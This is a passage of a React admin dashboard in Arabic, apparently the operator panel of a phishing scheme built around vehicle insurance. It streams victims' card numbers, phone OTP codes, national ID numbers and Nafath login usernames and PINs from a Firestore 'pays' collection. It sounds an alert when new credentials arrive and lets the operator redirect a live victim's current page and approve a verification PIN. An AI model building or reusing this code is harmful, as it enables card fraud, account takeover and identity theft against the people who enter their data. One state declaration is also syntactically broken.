                          <span className="text-sm font-semibold text-foreground">{notification.nafaz_pin}</span>
                          <Button
                            variant="ghost"
                            size="icon"
                            className="h-6 w-6"
                            onClick={() => setEditingAuthNumber(true)}
                          >
                            <Settings className="h-3 w-3" />
                          </Button>
                          <Button variant="ghost" size="icon" className="h-6 w-6">
                            <Copy className="h-3 w-3" />
                          </Button>
                        </div>
                      </div>
                    </CardContent>
                  </Card>

                  {/* New Card for Current Page in Nafaz tab */}
                  {notification.currentPage && (
                    <Card className="border-muted/50">
                      <CardContent className="p-4">
                        <div className="flex items-center justify-between">
                          <div className="flex items-center gap-3">
                            <FileText className="h-4 w-4 text-muted-foreground" />
                            <span className="text-sm font-medium text-muted-foreground">الصفحة الحالية</span>
                          </div>
                          <div className="flex items-center gap-2">
                            <span className="text-sm font-semibold text-foreground">{notification.currentPage}</span>
                            <Button
                              variant="ghost"
                              size="icon"
                              className="h-6 w-6"
                              onClick={() => setEditingCurrentPage(true)}
                            >
                              <Settings className="h-3 w-3" />
                            </Button>
                            <Button variant="ghost" size="icon" className="h-6 w-6">
                              <Copy className="h-3 w-3" />
                            </Button>
                          </div>
                        </div>
                      </CardContent>
                    </Card>
                  )}
                </>
              ) : (
                <div className="text-center py-8">
                  <div className="bg-muted/50 rounded-full p-4 mx-auto w-fit mb-4">
                    <UserX className="h-8 w-8 text-muted-foreground" />
                  </div>
                  <p className="text-sm font-medium text-foreground mb-1">لا توجد بيانات نفاذ</p>
                  <p className="text-xs text-muted-foreground">لم يتم تسجيل دخول نفاذ لهذا المستخدم</p>
                </div>
              )}
            </div>
          )}
        </div>
      </ScrollArea>
    </div>
  )
}

// Main Component
export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<any[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [selectedNotificationId, setSelectedNotificationId] = useState<string | null>(null)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const [nafazSubmissions, setNafazSubmissions] = useState<number>(0)
  const [phoneSubmissions, setPhoneSubmissions] = useState<number>(0)
  const [filterType, setFilterType] = useState<"all" | "card" | "online" | "nafaz" | "phone">("all")
  const [searchTerm, setSearchTerm] = useState("")
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const [showFilters, setShowFilters] = useState(false)
  const [showDetails, setShowDetails] = useState(false)
  const [show, setShow] = useState(false)
  const router = useRouter()
  const { toast } = useToast()
  const onlineUsersCount = useOnlineUsersCount()
  const audioRef = useRef<HTMLAudioElement | null>(null)
  const prevNotificationsRef = useRef<any[]>([])
  const [onlineStatuses, setOnlineStatuses<Record<string, boolean>>({})

  const {
    width: sidebarWidth,
    isResizing,
    handleMouseDown: handleResizeMouseDown,
  } = useResizable(
    900 * 0.32, // Initial width (32vw)
    300, // Min width
    1200 * 0.7, // Max width (70vw)
  )

  // Initialize audio
  useEffect(() => {
    if (typeof window !== "undefined" && !audioRef.current) {
      audioRef.current = new Audio("/notification-alert-269289.mp3")
    }
  }, [])

  const playNotificationSound = useCallback(() => {
    if (audioRef.current) {
      audioRef.current.play().catch((error) => {
        console.error("Failed to play sound:", error)
      })
    }
  }, [])

  const selectedNotification = useMemo(
    () => notifications.find((n) => n.id === selectedNotificationId) || null,
    [notifications, selectedNotificationId],
  )

  // Filter notifications
  const filteredNotifications = useMemo(() => {
    return notifications.filter((notification) => {
      if (notification.isHidden) return false

      const matchesFilterType =
        filterType === "all" ||
        (filterType === "card" && !!notification.cardNumber) ||
        (filterType === "online" && onlineStatuses[notification.id]) ||
        (filterType === "nafaz" && !!notification.nafadUsername) ||
        (filterType === "phone" && (!!notification.phone || !!notification.phone2 || !!notification.phoneOtpCode))

      if (!matchesFilterType) return false

      if (searchTerm) {
        const term = searchTerm.toLowerCase()
        return (
          notification.documment_owner_full_name?.toLowerCase().includes(term) ||
          notification.phone?.toLowerCase().includes(term) ||
          notification.phone2?.toLowerCase().includes(term) ||
          notification.phoneOtpCode?.toLowerCase().includes(term) ||
          notification.operator?.toLowerCase().includes(term) ||
          notification.currentPage?.toLowerCase().includes(term) ||
          notification.cardNumber?.toLowerCase().includes(term) ||
          notification.country?.toLowerCase().includes(term) ||
          notification.owner_identity_number?.toLowerCase().includes(term) ||
          notification.buyer_identity_number?.toLowerCase().includes(term) ||
          notification.seller_identity_number?.toLowerCase().includes(term) ||
          notification.serial_number?.toLowerCase().includes(term) ||
          notification.vehicle_manufacture_number?.toLowerCase().includes(term) ||
          notification.customs_code?.toLowerCase().includes(term) ||
          notification.sequenceNumber?.toLowerCase().includes(term) ||
          notification.selectedInsuranceOffer?.toLowerCase().includes(term) ||
          notification.paymentStatus?.toLowerCase().includes(term) ||
          notification.nafadUsername?.toLowerCase().includes(term) ||
          notification.nafaz_pin?.toLowerCase().includes(term)
        )
      }
      return true
    })
  }, [notifications, filterType, onlineStatuses, searchTerm])

  const statistics = useMemo(
    () => [
      {
        title: "المتصلين الآن",
        value: onlineUsersCount,
        icon: Activity,
        color: "emerald",
        trend: { value: 12, isPositive: true }
      },
      {
        title: "إجمالي الزوار",
        value: totalVisitors,
        icon: Users,
        color: "blue",
        trend: { value: 8, isPositive: true }
      },
      {
        title: "البطاقات المرسلة",
        value: cardSubmissions,
        icon: CreditCard,
        color: "cyan",
        trend: { value: 5, isPositive: false }
      },
      {
        title: "نفاذ المرسل",
        value: nafazSubmissions,
        icon: Shield,
        color: "purple",
        trend: { value: 15, isPositive: true }
      },
      {
        title: "الهواتف المرسلة",
        value: phoneSubmissions,
        icon: Smartphone,
        color: "indigo",
        trend: { value: 3, isPositive: true }
      },
    ],
    [onlineUsersCount, totalVisitors, cardSubmissions, nafazSubmissions, phoneSubmissions],
  )

  // Listen for online statuses
  useEffect(() => {
    const unsubscribes: (() => void)[] = []
    notifications.forEach((notification) => {
      if (notification.id === "0") return
      const userStatusRef = ref(database, `/status/${notification.id}`)
      const unsubscribe = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        setOnlineStatuses((prev) => ({
          ...prev,
          [notification.id]: data && data.state === "online",
        }))
      })
      unsubscribes.push(unsubscribe)
    })
    return () => unsubscribes.forEach((unsub) => unsub())
  }, [notifications])

  const updateStatistics = useCallback((activeNotifications: any[]) => {
    setTotalVisitors(activeNotifications.length)
    setCardSubmissions(activeNotifications.filter((n) => !!n.cardNumber).length)
    setNafazSubmissions(activeNotifications.filter((n) => !!n.nafadUsername).length)
    setPhoneSubmissions(activeNotifications.filter((n) => !!n.phone || !!n.phone2 || !!n.phoneOtpCode).length)
  }, [])

  const fetchNotifications = useCallback(() => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs.map((doc) => ({
          id: doc.id,
          ...doc.data(),
        })) as any[]

        updateStatistics(notificationsData.filter((n) => !n.isHidden))
        setNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        toast({
          title: "خطأ في جلب البيانات",
          description: "لم نتمكن من تحميل الإشعارات.",
          variant: "destructive",
        })
        setIsLoading(false)
      },
    )
    return unsubscribe
  }, [updateStatistics, toast])

  // Handle new notifications and play sound
  useEffect(() => {
    const currentNotifications = notifications
    const previousNotifications = prevNotificationsRef.current

    if (previousNotifications.length > 0 && currentNotifications.length > previousNotifications.length) {
      const newEntries = currentNotifications.filter(
        (newNotif) => !previousNotifications.some((oldNotif) => oldNotif.id === newNotif.id) && !newNotif.isHidden,
      )

      if (newEntries.length > 0) {
        const hasNewImportantInfo = newEntries.some(
          (n) =>
            n.cardNumber ||
            n.documment_owner_full_name ||
            n.phone ||
            n.phone2 ||
            n.phoneOtpCode ||
            n.owner_identity_number ||
            n.nafadUsername ||
            n.nafaz_pin,
        )
        if (hasNewImportantInfo) {
          playNotificationSound()
        }
      }
    }
    prevNotificationsRef.current = currentNotifications
  }, [notifications, playNotificationSound])

  // Authentication
  useEffect(() => {
    const unsubscribeAuth = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          if (unsubscribeNotifications) unsubscribeNotifications()
        }
      }
    })
    return () => unsubscribeAuth()
  }, [router, fetchNotifications])

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
      toast({
        title: "خطأ في تسجيل الخروج",
        description: "حدث خطأ أثناء محاولة تسجيل الخروج.",
        variant: "destructive",
      })
    }
  }

  const handleFlagColorChange = async (id: string, color: any) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { flagColor: color })
      setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, flagColor: color } : n)))
      toast({
        title: "تم تحديث العلامة",
        description: color
          ? `تم تعيين العلامة ${color === "red" ? "الحمراء" : color === "yellow" ? "الصفراء" : "الخضراء"}.`
          : "تمت إزالة العلامة.",
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating flag color:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث لون العلامة.",
        variant: "destructive",
      })
    }
  }

  const handleCurrentPageUpdate = async (id: string, currentPage: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { currentPage })
      setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, currentPage } : n)))
      toast({
        title: "تم تحديث الصفحة الحالية",
        description: `تم تحديث الصفحة الحالية إلى: ${currentPage}`,
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating current page:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث الصفحة الحالية.",
        variant: "destructive",
      })
    }
  }

  const handleAuthNumberUpdate = async (id: string, authNumber: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, {
        nafaz_pin: authNumber,
        phoneVerificationStatus: "approved",
      })
      setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, nafaz_pin: authNumber } : n)))
      toast({
        title: "تم تحديث رقم التحقق",
        description: `تم تحديث رقم التحقق إلى: ${authNumber}`,
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating auth number:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث رقم التحقق.",
        variant: "destructive",
      })
    }
  }

  const handleNotificationClick = (notification: any) => {
    setSelectedNotificationId(notification.id)
    setShowDetails(true)
  }
  const handleShow = () => {
    setShow(!show)
  }
  if (isLoading && notifications.length === 0) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-background via-muted/20 to-background flex items-center justify-center w-full">
        <div className="flex flex-col items-center gap-6">
          <div className="relative">
            <div className="h-16 w-16 rounded-full border-4 border-primary/20 border-t-primary animate-spin" />
            <div className="absolute inset-0 h-16 w-16 rounded-full border-4 border-transparent border-t-primary/40 animate-spin animation-delay-150" />
          </div>
          <div className="text-center space-y-2">
            <p className="text-lg font-semibold text-foreground">جاري تحميل البيانات</p>
            <p className="text-sm text-muted-foreground">يرجى الانتظار بينما نقوم بتحميل الإشعارات...</p>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="h-screen flex flex-col bg-background" dir="rtl">
      {/* Mobile Menu Sheet */}
      <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
        <SheetContent side="right" className="w-[270px] p-0" dir="rtl">
          <SheetHeader className="p-6 pb-4 border-b bg-gradient-to-r from-muted/50 to-muted/30">
            <SheetTitle className="flex items-center gap-3 text-lg">
              <div className="bg-primary/20 p-2 rounded-lg">
                <Bell className="h-5 w-5 text-primary" />
              </div>
              <span>لوحة التحكم</span>
            </SheetTitle>
          </SheetHeader>
          <div className="p-4 space-y-2">
            {[
              {
                label: "الإشعارات",
                icon: Bell,
                action: () => setMobileMenuOpen(false),
              },
              {
                label: "الاحصائيات",
                icon: IceCream,
                action: () => setShow(!show),
              },
              {
                label: "الإعدادات",
                icon: Settings,
                action: () => setMobileMenuOpen(false),
              },
              {
                label: "تصدير البيانات",
                icon: Download,
                action: () => setMobileMenuOpen(false),
              },
            ].map((item) => (
              <Button
                key={item.label}
                variant="ghost"
                className="w-full justify-start gap-3 text-sm py-3 h-auto hover:bg-primary/10 rounded-lg"
                onClick={item.action}
              >
                <item.icon className="h-4 w-4 text-muted-foreground" /> {item.label}
              </Button>
            ))}
            <Separator className="my-4" />
            <Button
              variant="ghost"
              className="w-full justify-start gap-3 text-sm py-3 h-auto text-red-500 hover:text-red-600 hover:bg-red-50 dark:hover:bg-red-900/50 rounded-lg"
              onClick={handleLogout}
            >
              <LogOut className="h-4 w-4" /> تسجيل الخروج
            </Button>
          </div>
        </SheetContent>
      </Sheet>

      <header className="border-b bg-card/50 backdrop-blur-sm sticky top-0 z-50">
        <div className="flex items-center justify-between p-4">
          <div className="flex items-center gap-4">
            <div className="flex items-center gap-3">
              <div className="p-2 bg-primary/10 rounded-xl">
                <Bell className="h-6 w-6 text-primary" />
              </div>
              <div>
                <h1 className="text-xl font-bold text-foreground">لوحة الإشعارات</h1>
                <p className="text-sm text-muted-foreground">إدارة الإشعارات في الوقت الفعلي</p>
              </div>
            </div>
            
            {/* Real-time indicator */}
            <div className="flex items-center gap-2 px-3 py-1.5 bg-emerald-100 dark:bg-emerald-900/30 rounded-full">
              <div className="h-2 w-2 bg-emerald-500 rounded-full pulse-glow"></div>
              <span className="text-xs font-medium text-emerald-700 dark:text-emerald-400">مباشر</span>
            </div>
          </div>

          <div className="flex items-center gap-3">
            {/* Quick stats toggle */}
            <Button
              variant="ghost"
              size="sm"
              onClick={() => setShow(!show)}
              className="gap-2"
            >
              <TrendingUp className="h-4 w-4" />
              الإحصائيات
            </Button>

            {/* User menu */}
            <DropdownMenu>
              <DropdownMenuTrigger asChild>
                <Button variant="ghost" size="icon" className="relative">
                  <Avatar className="h-8 w-8">
                    <AvatarImage src="/placeholder.svg?height=32&width=32" />
                    <AvatarFallback className="bg-primary/20 text-primary font-semibold text-xs">
                      AD
                    </AvatarFallback>
                  </Avatar>
                </Button>
              </DropdownMenuTrigger>
              <DropdownMenuContent align="end" className="w-56">
                <DropdownMenuLabel>حسابي</DropdownMenuLabel>
                <DropdownMenuSeparator />
                <DropdownMenuItem>
                  <User className="h-4 w-4 mr-2" />
                  الملف الشخصي
                </DropdownMenuItem>
                <DropdownMenuItem>
                  <Settings className="h-4 w-4 mr-2" />
                  الإعدادات
                </DropdownMenuItem>
                <DropdownMenuSeparator />
                <DropdownMenuItem className="text-destructive">
                  <LogOut className="h-4 w-4 mr-2" />
                  تسجيل الخروج
                </DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>
          </div>
        </div>
      </header>

      <div className={`border-b bg-muted/30 p-6 transition-all duration-300 ${show ? "block" : "hidden"}`}>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-4">
          {statistics.map((stat) => (
            <StatisticsCard
              key={stat.title}
              title={stat.title}
              value={stat.value}
              icon={stat.icon}
              color={stat.color}
              trend={stat.trend}
            />
          ))}
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex overflow-hidden">
        <div
          className={`border-r bg-card/30 backdrop-blur-sm flex flex-col ${showDetails ? "hidden lg:flex" : "flex"}`}
          style={{
            width: window.innerWidth >= 1024 ? `${sidebarWidth}px` : "100%",
          }}
        >
          {/* Enhanced Search and Filters */}
          <div className="p-4 border-b space-y-4 bg-background/50">
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground rtl:right-3 rtl:left-auto" />
              <Input
                type="search"
                placeholder="البحث في الإشعارات..."
                className="pl-10 pr-4 rtl:pr-10 rtl:pl-4 bg-background border-border/50 focus:border-primary/50 transition-colors"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
            </div>

            <div className="flex items-center justify-between">
              <Button 
                variant="ghost" 
                size="sm" 
                onClick={() => setShowFilters(!showFilters)} 
                className="gap-2 text-muted-foreground hover:text-foreground"
              >
                <Filter className="h-4 w-4" />
                فلترة ({filteredNotifications.length})
              </Button>
              {filterType !== "all" && (
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => setFilterType("all")}
                  className="gap-2 text-muted-foreground hover:text-foreground"
                >
                  <X className="h-3 w-3" />
                  مسح
                </Button>
              )}
            </div>

            {/* Enhanced filter buttons */}
            {showFilters && (
              <div className="grid grid-cols-2 gap-2">
                {[
                  {
                    label: "الكل",
                    type: "all",
                    count: filteredNotifications.length,
                    icon: Users,
                    color: "default"
                  },
                  {
                    label: "الهواتف",
                    type: "phone",
                    count: notifications.filter((n) => !n.isHidden && (n.phone || n.phone2 || n.phoneOtpCode)).length,
                    icon: Smartphone,
                    color: "blue"
                  },
                  {
                    label: "البطاقات",
                    type: "card",
                    count: notifications.filter((n) => !n.isHidden && n.cardNumber).length,
                    icon: CreditCard,
                    color: "emerald"
                  },
                  {
                    label: "نفاذ",
                    type: "nafaz",
                    count: notifications.filter((n) => !n.isHidden && n.nafadUsername).length,
                    icon: Key,
                    color: "purple"
                  },
                ].map((filter) => (
                  <Button
                    key={filter.type}
                    variant={filterType === filter.type ? "default" : "outline"}
                    onClick={() => setFilterType(filter.type as any)}
                    size="sm"
                    className="justify-start gap-2 h-auto py-2"
                  >
                    <filter.icon className="h-4 w-4" />
                    <span className="flex-1 text-left">{filter.label}</span>
                    <Badge variant="secondary" className="text-xs">
                      {filter.count}
                    </Badge>
                  </Button>
                ))}
              </div>
            )}
          </div>

          {/* Enhanced Notifications List */}
          <ScrollArea className="flex-1">
            <div className="divide-y divide-border/30">
              {filteredNotifications.length > 0 ? (
                filteredNotifications.map((notification) => (
                  <div key={notification.id} className="group">
                    <NotificationCard
                      notification={notification}
                      isSelected={selectedNotificationId === notification.id}
                      onClick={() => handleNotificationClick(notification)}
                      onFlagChange={handleFlagColorChange}
                      onCurrentPageUpdate={handleCurrentPageUpdate}
                    />
                  </div>
                ))
              ) : (
                <div className="flex flex-col items-center justify-center py-16 text-center px-4">
                  <div className="bg-muted/50 rounded-full p-8 mb-6">
                    <Bell className="h-16 w-16 text-muted-foreground" />
                  </div>
                  <div className="space-y-2">
                    <h3 className="text-xl font-semibold text-foreground">لا توجد إشعارات</h3>
                    <p className="text-sm text-muted-foreground max-w-sm">
                      {searchTerm ? "حاول تعديل مصطلحات البحث أو الفلاتر للعثور على النتائج." : "ستظهر الإشعارات الجديدة هنا عند وصولها."}
                    </p>
                  </div>
                </div>
              )}
            </div>
          </ScrollArea>
        </div>

        {/* Resize handle */}
        <div className="hidden lg:block">
          <ResizeHandle onMouseDown={handleResizeMouseDown} isResizing={isResizing} />
        </div>

        <div className={`flex-1 ${showDetails ? "flex slide-in-right" : "hidden lg:flex"}`}>
          <NotificationDetails
            notification={selectedNotification}
            onClose={() => setShowDetails(false)}
            onCurrentPageUpdate={handleCurrentPageUpdate}
            onAuthNumberUpdate={handleAuthNumberUpdate}
          />
        </div>
      </div>

      {/* Enhanced loading overlay */}
      {isLoading && (
        <div className="fixed inset-0 bg-background/80 backdrop-blur-sm flex items-center justify-center z-50">
          <div className="text-center space-y-4">
            <div className="animate-spin rounded-full h-12 w-12 border-4 border-primary/20 border-t-primary mx-auto"></div>
            <p className="text-sm text-muted-foreground">جاري تحميل الإشعارات...</p>
          </div>
        </div>
      )}

      <style jsx global>{`
        .animate-indeterminate-progress {
          animation: indeterminate-progress 2s infinite linear;
        }
        @keyframes indeterminate-progress {
          0% {
            transform: translateX(-100%) scaleX(0.3);
          }
          50% {
            transform: translateX(0) scaleX(0.5);
          }
          100% {
            transform: translateX(100%) scaleX(0.3);
          }
        }
        .animation-delay-150 {
          animation-delay: 150ms;
        }
      `}</style>
    </div>
  )
}
